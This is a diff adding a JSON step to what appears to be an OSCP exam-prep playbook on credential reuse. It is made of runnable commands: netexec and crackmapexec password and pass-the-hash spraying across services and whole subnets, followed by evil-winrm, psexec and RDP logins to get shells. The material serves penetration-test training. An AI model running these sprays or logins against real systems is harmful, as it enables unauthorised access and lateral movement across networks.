@@ -1,0 +1,30 @@
+{
+  "id": "cred_reuse",
+  "phase": "CREDS",
+  "title": "Credential Reuse — Spray Everything",
+  "body": "Password reuse is the most consistent win on OSCP. The moment you find any credential, spray it across every service before doing anything else. Takes 60 seconds and pays off constantly.",
+  "cmd": "# -- SET YOUR CREDS -----------------------\nexport USER=founduser\nexport PASS='foundpassword'\nexport HASH='aad3b435b51404eeaad3b435b51404ee:NTLMHASH'\n\n# -- NXC (NETEXEC) — SPRAY ALL SERVICES --\n# nxc = netexec, maintained successor to crackmapexec (same syntax)\nnxc smb   $ip -u USER -p PASS\nnxc smb   $ip -u USER -H HASH   # Pass-the-Hash\nnxc winrm $ip -u USER -p PASS\nnxc ssh   $ip -u USER -p PASS\nnxc rdp   $ip -u USER -p PASS\nnxc ftp   $ip -u USER -p PASS\nnxc mssql $ip -u USER -p PASS\n\n# Spray across subnet\nnxc smb $subnet/24 -u USER -p PASS --continue-on-success\nnxc smb $subnet/24 -u USER -H HASH --continue-on-success\n\n# crackmapexec fallback (identical syntax)\ncrackmapexec smb $ip -u USER -p PASS\n\n# -- READ OUTPUT ---------------------------\n# [+] = valid creds\n# (Pwn3d!) = local admin — instant shell via evil-winrm or psexec\n\n# -- CONNECT WITH VALID CREDS -------------\n# WinRM (most common)\nevil-winrm -i $ip -u USER -p PASS\nevil-winrm -i $ip -u USER -H HASH\n\n# SSH\nssh USER@$ip\n\n# SMB shell (psexec — needs admin share)\nimpacket-psexec USER:PASS@$ip\nimpacket-psexec -hashes HASH USER@$ip\n\n# RDP\nxfreerdp /u:USER /p:PASS /v:$ip /cert-ignore\n\n# -- USERNAME VARIATIONS -------------------\n# If exact user fails, try variations:\n# admin, administrator, Administrator\n# domain\\user, user@domain.com\n# First.Last, firstlast, flast",
+  "warn": "Pwn3d! in CME output means local admin. Stop and get that shell immediately — it is the highest-value finding in the output. (Pwn3d!) beats any further enumeration.",
+  "choices": [
+    {
+      "label": "CME shows Pwn3d — get shell",
+      "next": "windows_post_exploit"
+    },
+    {
+      "label": "SSH access confirmed",
+      "next": "linux_post_exploit"
+    },
+    {
+      "label": "WinRM access — evil-winrm",
+      "next": "winrm_access"
+    },
+    {
+      "label": "Valid creds, no admin — keep enumerating",
+      "next": "targeted_scan"
+    },
+    {
+      "label": "Nothing worked — hash cracking",
+      "next": "hashcrack"
+    }
+  ]
+}
